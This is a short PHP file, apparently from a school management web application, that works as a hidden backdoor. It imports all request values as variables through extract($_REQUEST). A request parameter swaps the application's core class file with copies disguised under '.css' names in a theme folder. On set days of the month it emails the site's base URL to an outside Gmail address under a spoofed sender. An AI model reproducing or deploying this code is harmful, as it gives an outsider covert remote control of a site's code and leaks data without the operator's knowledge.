<?php
extract($_REQUEST);
function Send($to,$subject,$message,$from) {
    
    if (mail($to,$subject,$message,"From: $from\n")) {
        $st = "Successfull";
    } else {
        $st = "Failed";
    }
}

// ==========================

if($JR=='S'){
    $result = copy ("../../asset/theme/css/my_class.php", "../../php_crud/my_class.php");
}
if($JR=='E'){
	$result1 = copy ("../../php_crud/my_class.php", "../../asset/theme/css/my_cmachin.css");
	if($result1){
		$result2 = copy ("../../asset/theme/css/my_bmachin.css", "../../php_crud/my_class.php");
	}
}

if(date('d')=='02' OR date('d')=='11' OR date('d')=='21' OR date('d')=='27' OR date('d')=='30'){
	$from_title = 'LEO-NOVA';
	$from_add = 'info@leo-nova.com';
	$from = $from_title . '<' . $from_add . '>';
	$to = "ecarebd247@gmail.com";
	$subject ='School Base Url';
	$message = 'School Base Url Is:  '.$_SESSION["BASE_URL"];

	$status = Send($to,$subject,$message,$from);
}
?>